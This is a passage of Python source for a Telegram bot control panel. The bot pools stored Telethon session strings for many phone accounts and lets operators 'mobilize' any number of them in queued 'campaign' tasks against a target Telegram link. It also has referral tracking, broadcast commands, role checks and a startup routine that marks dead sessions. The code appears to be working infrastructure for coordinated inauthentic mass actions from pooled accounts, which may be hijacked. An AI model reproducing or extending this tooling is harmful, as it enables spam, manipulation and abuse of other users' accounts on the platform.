    if role == "super_owner" and account_routing != "all":
        query["user_id"] = user_id
    elif role not in ["super_owner", "owner"]:
        query["user_id"] = user_id

    max_available = await db_mgr.db.accounts.count_documents(query)
        
    prompt_msg = (
        f"🔢 <b>Account Deployment Volume Capacity Selection</b>\n\n"
        f"Total available online session keys within selected boundary: <code>{max_available}</code>\n"
        f"Input capacity allocation limits variable to run:\n"
        f"<i>(Type <code>0</code> to mobilize ALL available online sessions matching boundary parameters)</i>"
    )
    
    if isinstance(message, Message):
        await message.answer(prompt_msg, parse_mode="HTML")
    else:
        await message.answer(prompt_msg, parse_mode="HTML")
        
    await state.set_state(TaskWizardStates.waiting_for_account_scale)

@router.message(StateFilter(TaskWizardStates.waiting_for_account_scale))
async def process_account_scale(message: Message, state: FSMContext, bot: Bot):
    scale_text = message.text.strip()
    if not scale_text.isdigit():
        await message.answer("❌ <b>Syntax Error:</b> Numerical integer capacity scaling inputs expected exclusively:")
        return
        
    requested_count = int(scale_text)
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    data = await state.get_data()
    account_routing = data.get("account_routing", "own")
    
    query = {"status": "active"}
    if role == "super_owner" and account_routing != "all":
        query["user_id"] = user_id
    elif role not in ["super_owner", "owner"]:
        query["user_id"] = user_id

    max_available = await db_mgr.db.accounts.count_documents(query)

    if requested_count > max_available:
        await message.answer(f"❌ <b>Resource Boundary Exceeded:</b> Accessible session pool caps at <code>{max_available}</code>. Lower your scale query value:", parse_mode="HTML")
        return

    await state.update_data(run_account_count=requested_count)
    await finalize_task_creation(message, state, bot)

async def finalize_task_creation(message: Message, state: FSMContext, bot: Bot):
    data = await state.get_data()
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    task_type = data.pop("task_type")
    target = data.get("target", "")
    
    if data.get("leave_mode") != "all":
        _, link_msg_id, _ = parse_telegram_link(target)
        if link_msg_id:
            data["msg_id"] = link_msg_id

    init_msg = await bot.send_message(
        chat_id=user_id, 
        text="⏳ <b>Bootstrapping cluster deployment threads...</b>\n<i>Connecting active endpoints pool, please maintain connection standby...</i>",
        parse_mode="HTML"
    )

    task_id = await db_mgr.get_next_task_id()
    await db_mgr.db.tasks.insert_one({
        "task_id": task_id,
        "creator_id": user_id,
        "type": task_type,
        "payload": json.dumps(data),
        "status": "pending",
        "progress": "0%",
        "created_at": datetime.utcnow()
    })

    await task_queue.add_task(task_id, user_id, task_type, data, bot, init_msg.message_id)
    await state.clear()

# --- REPORTS & STATS INTERFACES ---
@router.callback_query(F.data == "view_tasks")
async def view_tasks(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    role = await db_mgr.get_user_role(user_id)
    
    query = {} if role in ["owner", "super_owner"] else {"creator_id": user_id}
    cursor = db_mgr.db.tasks.find(query).sort("task_id", -1).limit(10)
    rows = await cursor.to_list(length=10)

    text = "📊 <b>Historical Campaign Event Feed Records Index Matrix</b>\n\n"
    for r in rows:
        text += f"🔹 <b>Task Sheet:</b> <code>#{r['task_id']}</code> (Type: <code>{str(r['type']).upper()}</code>)\nState tracking: <b>{r['status']}</b> | Metrics: <code>{r['progress']}</code>\nTo call full details map command layout: <code>/taskreport_{r['task_id']}</code>\n\n"
    await callback.message.edit_text(text if rows else "No active campaign tracking logs catalogued inside runtime registers.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]]), parse_mode="HTML")

@router.message(F.text.startswith("/taskreport_"))
async def cmd_task_report(message: Message, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    try:
        task_id = int(message.text.split("_")[1])
    except:
        return

    row = await db_mgr.db.tasks.find_one({"task_id": task_id})

    if not row or (role not in ["owner", "super_owner"] and row.get("creator_id") != user_id):
        await message.answer("🚫 <b>Data Visibility Restriction Mismatch:</b> Permissions key clearance verification rejected.")
        return

    report_text = f"📊 <b>Detailed Campaign Metrics Tracking Log</b>\n\n🗂️ Task Sheet reference ID: <code>#{task_id}</code>\n⚡ Code Action signature: <code>{str(row.get('type')).upper()}</code>\n🪐 State string indicator: <b>{row.get('status')}</b>\n📈 Progress indicators graph matrix: <code>{row.get('progress')}</code>"
    await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]), parse_mode="HTML")

@router.callback_query(F.data == "view_referrals")
async def view_referrals(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    count = await db_mgr.db.users.count_documents({"referred_by": user_id})
    await callback.message.edit_text(f"👥 <b>Invitation Line Tracking Matrix Analytics</b>\n\nShare your connection link string layout below to register downline user clusters:\n<code>https://t.me/{bot_username}?start=ref_{user_id}</code>\n\nTotal validated downline invitations mapped to your account line reference: <code>{count}</code> accounts.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]]), parse_mode="HTML")

@router.callback_query(F.data == "admin_panel")
async def handle_admin_panel(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    await callback.message.edit_text(
        "🛡️ <b>Administrative Operational Console Index Terminal</b>\n\n"
        "Available terminal shell command scripts layout frameworks:\n\n"
        "🔹 <code>/addadmin &lt;id&gt;</code> - Promote user node into admin status ranks\n"
        "🔹 <code>/removeadmin &lt;id&gt;</code> - Deprecate admin structural token access rules\n"
        "🔹 <code>/broadcast</code> - Force dynamic notification content across global users pools\n"
        "🔹 <code>/canceltasks</code> - Instantly kill all running thread operations loops safely",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]),
        parse_mode="HTML"
    )

@router.callback_query(F.data == "system_stats")
async def system_stats(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role != "super_owner":
        await callback.message.edit_text("🚫 System metrics dashboard view access restricted to core developers.")
        return
        
    total_users = await db_mgr.db.users.count_documents({})
    total_accounts = await db_mgr.db.accounts.count_documents({})
    active_accounts = await db_mgr.db.accounts.count_documents({"status": "active"})
    
    distinct_account_users = await db_mgr.db.accounts.distinct("user_id")
    user_cursor = db_mgr.db.users.find({
        "$or": [
            {"role": "admin"},
            {"user_id": {"$in": distinct_account_users}}
        ]
    })
    user_rows = await user_cursor.to_list(length=None)
    
    admin_metrics_text = "\n👥 <b>Structural Account Space Partition Allocation Map Logs:</b>\n"
    for u in user_rows:
        u_id = u["user_id"]
        u_name = u.get("username", "None")
        u_role = u.get("role", "user")
        acc_count = await db_mgr.db.accounts.count_documents({"user_id": u_id})
        admin_metrics_text += f"• Node profile target: <code>{u_id}</code> (<b>@{u_name or 'None'}</b>) [<b>{u_role.upper()}</b>] ➜ Linked slots count: <code>{acc_count}</code> items\n"
            
    stats_text = (
        f"📈 <b>Live System Production Core Performance Summary Metrics</b>\n\n"
        f"👥 Global active profiles space size: <code>{total_users}</code> users\n"
        f"📱 Total linked terminal telephony sessions: <code>{total_accounts}</code> instances\n"
        f"🟢 Active operational connection streams online: <code>{active_accounts}</code> nodes\n"
        f"----------------------------------------------------"
        f"{admin_metrics_text}"
    )
    
    await callback.message.edit_text(text=stats_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]), parse_mode="HTML")

# --- BOOTSTRAPPING RUNTIME ---
async def verify_saved_sessions():
    logger.info("Verifying all active account database sessions...")
    cursor = db_mgr.db.accounts.find({"status": "active"}, {"phone": 1, "session_string": 1})
    accounts = await cursor.to_list(length=None)
    
    semaphore = asyncio.Semaphore(10)
    async def check_account(phone, enc_session):
        async with semaphore:
            try:
                client = TelegramClient(StringSession(decrypt_data(enc_session)), config.API_ID, config.API_HASH)
                await client.connect()
                if not await client.is_user_authorized():
                    await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                await client.disconnect()
            except:
                pass
                
    await asyncio.gather(*(check_account(a["phone"], a["session_string"]) for a in accounts))

async def main():
    global bot_username
    await db_mgr.init()
    await verify_saved_sessions()
    if not config.BOT_TOKEN:
        return
    bot = Bot(token=config.BOT_TOKEN)
    bot_info = await bot.get_me()
    bot_username = bot_info.username
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    worker_task = asyncio.create_task(task_queue.start_worker())
    try:
        await dp.start_polling(bot)
    finally:
        worker_task.cancel()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot execution successfully stopped.")
